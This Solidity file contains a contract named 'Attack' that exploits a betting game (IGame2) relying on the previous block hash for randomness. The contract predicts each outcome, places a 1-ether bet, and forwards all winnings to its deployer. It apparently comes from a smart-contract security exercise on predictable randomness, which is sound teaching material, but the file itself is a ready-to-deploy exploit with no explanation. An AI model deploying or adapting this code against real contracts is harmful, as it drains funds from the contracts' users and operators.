// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;

interface IGame2 {
    function play(bool _guess) external payable;

    function players(address) external;
}

contract Attack {
    IGame2 game;
    address payable owner;

    constructor(address _game) {
        game = IGame2(_game);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        // uint representation of previous block hash
        uint256 value = uint256(blockhash(block.number - 1));
        // Generate a random number, and check the answer
        uint256 random = value % 2;
        bool answer = random == 1 ? true : false;
        game.play{value: 1 ether}(answer);
    }

    receive() external payable {
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send ETH");
    }
}
